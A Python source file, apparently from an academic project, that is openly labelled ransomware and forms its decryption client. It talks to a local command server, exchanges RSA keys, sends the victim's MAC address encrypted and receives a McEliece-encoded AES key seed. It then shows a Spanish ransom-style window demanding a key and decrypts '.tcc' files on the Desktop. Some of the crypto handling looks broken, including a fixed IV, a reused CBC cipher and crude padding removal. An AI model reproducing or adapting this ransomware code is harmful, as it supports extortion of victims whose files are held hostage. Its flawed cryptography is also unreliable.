
from Crypto.Cipher import AES
import os
from pickle import TRUE
import socket
import uuid
from Crypto.Util import number
from os.path import exists
from Crypto.Hash import SHA256
import time
import tkinter as tk


"""
This function calculates the position 
in decimal given a vector of three bits
(1,1,1) -> 2⁰ + 2¹ + 2²

@returns int with the position 
"""
def calculate_bin(a1,a2,a3):
    sol_1 = 0
    sol_2 = 0
    sol_3 = 0
    sol = 0

    if(a1 == 1):
        sol_1 = pow(2, 2)
    if(a2 == 1):
        sol_2 = pow(2,1)
    if(a3 == 1):
        sol_3 = pow(2,0) 
    
    sol = sol_1+sol_2+sol_3
    return sol

"""
@params -> bytes encoded

Uses S, G and P matrix.

@returns -> bytes (bytes of the innitial msg) 
"""
def mcEliece_decode(bytes_):

    # H matrix in Hamming(3,4) code.
    H_t = [[0,0,1],[0,1,0],[0,1,1],[1,0,0],[1,0,1],[1,1,0],[1,1,1]]

    Palabras_decoded = []

    for byte in bytes_:
        
        # Obtain bits of the byte.
        bits = bin(byte)[2:].rjust(8,'0')

        # Doing the permutation as multiplying with P.
        p3 = int(bits[1])
        b2 = int(bits[2])
        b4 = int(bits[3])
        b3 = int(bits[4])
        p1 = int(bits[5])
        p2 = int(bits[6])
        b1 = int(bits[7])

        bits_ = []
        bits_.append(0)
        bits_.append(b1)
        bits_.append(b2)
        bits_.append(b3)
        bits_.append(b4)
        bits_.append(p1)
        bits_.append(p2)
        bits_.append(p3)


        # Verify Syndrome
        for i in range(0,3):
            
            v1 = b1*H_t[0][i]
            v2 = b2*H_t[1][i]
            v3 = b3*H_t[2][i]
            v4 = b4*H_t[3][i]
            
            v5 = p1*H_t[4][i]
            v6 = p2*H_t[5][i]
            v7 = p3*H_t[6][i]


            if(i == 0):
                a0 = v1 ^ v2 ^ v3 ^ v4 ^ v5 ^ v6 ^ v7 
            if(i == 1):
                a1 = v1 ^ v2 ^ v3 ^ v4 ^ v5 ^ v6 ^ v7
            if(i == 2):
                a2 = v1 ^ v2 ^ v3 ^ v4 ^ v5 ^ v6 ^ v7


        # Synd == 0 -> Word is in the code, VALID!
        if(a0 == 0 and a1 == 0 and a2 == 0):
            #print("WORD IS VALID")
            #print(bits)
            temp_bits_cadena = list(bits_)
            cadena_bits = ""
            for bit_int in temp_bits_cadena:
                cadena_bits = cadena_bits+ str(bit_int)


            Palabras_decoded.append(cadena_bits)
        else:
            #print("WORD INVALID!!!")
            #print(bits_)
            #print("SYNDROME:")
            sindrome = []
            sindrome.append(a0)
            sindrome.append(a1)
            sindrome.append(a2)
            #print(sindrome)

            #sindrome_str = str(a0)+str(a1)+str(a2)
            # El error está en el numero binario que forma el sindrome.
            pos_error = calculate_bin(a0,a1,a2)
          #  #print("El error esta contando desde la izquierda (sin contar el primer bit)")
          #  #print(sindrome_str)
          #  #print(pos_error)
          #  #print("PROCESO DE REEMPLAZO DEL BIT.")

            temp_bits_cadena = list(bits_)
            #print(temp_bits_cadena)
            #print("CORRECCION DE BIT DESPUÉS ROTACIÓN")
            if (temp_bits_cadena[pos_error] == 0):
                temp_bits_cadena[pos_error] = 1
            else:
                temp_bits_cadena[pos_error] = 0


            #print(temp_bits_cadena)
            cadena_bits = ""
            for bit_int in temp_bits_cadena:
                cadena_bits = cadena_bits+ str(bit_int)
            
            #print("DECODED WORD IS: "+cadena_bits)
            Palabras_decoded.append(cadena_bits)
    


    #print(Palabras_decoded)

    """
    Now, we have to recover the real msg.
    """
    Mensaje_original_bloques_4 = []

    S_inv = [[1,1,1,0],[1,0,1,1],[0,1,1,1],[1,0,1,0]]

    for palabra in Palabras_decoded:

        # First, x G = word.

        list_char_pal = list(palabra)
        u1 = int(list_char_pal[7])
        u2 = int(list_char_pal[6])
        u3 = int(list_char_pal[3])
        u4 = int(list_char_pal[5])

        for i in range(0,4):

            # Operations of multiplying bits b1-b4 with the matrix.
            d1 = u1* S_inv[0][i]
            d2 = u2* S_inv[1][i]
            d3 = u3* S_inv[2][i]
            d4 = u4* S_inv[3][i]

            if(i == 0):
                c0 = d1 ^ d2 ^ d3 ^ d4 
            if(i == 1):
                c1 = d1 ^ d2 ^ d3 ^ d4 
            if(i==2):
                c2 = d1 ^ d2 ^ d3 ^ d4 
            if(i==3):
                c3 = d1 ^ d2 ^ d3 ^ d4 
        


        aux = str(c0)+str(c1)+str(c2)+str(c3)

        Mensaje_original_bloques_4.append(aux)
            

    # Full msg in bytes
    mensaje_in_bytes = []
    for j in range(0, len(Mensaje_original_bloques_4)-1, 2):

        concat_str = ""
        concat_str = Mensaje_original_bloques_4[j] + Mensaje_original_bloques_4[j+1]
        mensaje_in_bytes.append(concat_str)
    
    """
    for b in Mensaje_original_bloques_4:
        print(b)


    for byte in mensaje_in_bytes:
        print(byte)

    """
    # Once we get all the bytes in str. We have to turn them into real bytes using ints.



    the_bytes = b''

    for byte in mensaje_in_bytes:
        word_to_byte = int(byte,2)
        the_bytes = the_bytes.__add__(int.to_bytes(word_to_byte, 1, 'little'))


    
    
    return the_bytes



################################################################################
##   RSA    RANSOMWARE      public & private key            #
################################################################################

p = number.getPrime(256)
q = number.getPrime(256)
f = (p-1) * (q-1)
e = 65537
n = p*q
d = pow(e, -1, f) 


# Create a socket TCP_IP.
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('localhost', 8080)) # Connect with server.

time.sleep(2)
# First, ransomware sends a msg to the server. The server will be able to recognise ransomware.
client_socket.sendall(bytes(str("Hola, soy el desencriptador"), 'utf8'))


# Receive n from server
data_temp = client_socket.recv(500)
n_temp = str(data_temp, 'utf8')
n_servidor = int(n_temp)
print("n from server OK.")


# Receive e from server
data_temp = client_socket.recv(256)
e_temp = str(data_temp, 'utf8')
e_servidor = int(e_temp)
print("e from server OK.")

time.sleep(3)
# Send n & e from ransomware.
client_socket.send(bytes(str(n), 'utf8'))
time.sleep(3)
client_socket.send(bytes(str(e), 'utf8'))


# Cipher MAC address in order to send it to server. Mac will be used for locate the key used in AES (server-side).
cifrado = pow(uuid.getnode(), e_servidor, n_servidor)

# Send MAC address ciphered.
time.sleep(3)
client_socket.send(bytes(str(cifrado), 'utf8'))
print("mac sent.")



# Receive AES ciphered from server
data_temp = client_socket.recv(1024)
print(data_temp)
print("AES from server encoded OK.")

client_socket.close()



THE_AES_KEY_FOR_HASH = mcEliece_decode(data_temp)
print("THE AES KEY FOR HASh DECODED")
print(THE_AES_KEY_FOR_HASH)

class InterfazDesencriptar: 
    
    key = ""
    def __init__(self):
        self.key = b""
        
    def iniciarInterfaz(self):
        root = tk.Tk()
        
        def f(self, str):
            self.key = str
            time.sleep(3)
            root.destroy()


        # specify size of window.
        root.geometry("500x190")
        root.title(" TCC22 - RANSOMWARE ")
        # Create text widget and specify size.
        T = tk.Text(root, height = 5, width = 70)
        
        # Create label
        l = tk.Label(root, text = "Tus archivos han sido encriptados",bg="red")
        l.config(font =("Courier", 14))
        
        Fact = """Para desencriptar los archivos, necesitarás la vacuna (key) que deberás introducir en el siguiente recuadro.
        NOTA: Cuando ingreses la key se cerrará esta interfaz. Si es correcta se desencriptará todo correctamente."""
        
        # Create button for next text.
        inputtxt = tk.Entry(root)
        b3 = tk.Button(root, text="Validar vacuna", command= lambda: f(self, inputtxt.get()))
        
        # Create an Exit button.
        b2 = tk.Button(root, text = "Exit",
                    command = root.destroy)
        

        l.pack()
        T.pack()
        inputtxt.pack()
        b3.pack()
        b2.pack()
        
        # Insert The Fact.
        T.insert(tk.END, Fact)
        
        tk.mainloop()

interface = InterfazDesencriptar()
interface.iniciarInterfaz()

h = SHA256.new(b"".join([THE_AES_KEY_FOR_HASH,  interface.key.encode('utf8')]))

#print("La key AES, equivale a :")
KEY_AES = h.digest()
#print(KEY_AES)

PATH_DESKTOP = "/home/adrian/Desktop/pen/"

"""
PATH_DESKTOP = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') 
PATH_DOCUMENTS = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents') 
PATH_DOWNLOADS = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads') 

"""

file_list = []


for root, _, filenames in os.walk(PATH_DESKTOP):
    for filename in filenames:
        if(filename == "README_TCC22.txt" or filename == "Desencript.exe" or filename == "Encriptador.exe" or filename == "Boletín.pdf"):
            continue
        file_list.append(os.path.join(root, filename))

"""""
for root, _, filenames in os.walk(PATH_DOCUMENTS):
    for filename in filenames:
        if(filename == "Desencript.exe" or filename == "Encriptador.exe" or filename == "Boletín.pdf"):
            continue
        file_list.append(os.path.join(root, filename))

for root, _, filenames in os.walk(PATH_DOWNLOADS):
    for filename in filenames:
        if(filename == "Desencript.exe" or filename == "Encriptador.exe" or filename == "Boletín.pdf"):
            continue
        file_list.append(os.path.join(root, filename))
"""

IV = b'Esto es un IV456'

cipher = AES.new(KEY_AES, AES.MODE_CBC, IV)

for file in file_list:

    # if(file)
    #print(file)

    with open(file,'rb') as f:
        iv = f.read(16)
        ct = f.read()
    f.close()

    
    pt = cipher.decrypt(ct) 

    fileNew = file[:-6] #eliminamos el .tcc y la devolvemos a su estado

    #print(fileNew)

    with open(fileNew, 'wb') as archivoDesencriptado:
        archivoDesencriptado.write(pt.rstrip(b'0'))
    archivoDesencriptado.close()

    if(os.path.isfile(fileNew)):
        os.remove(file)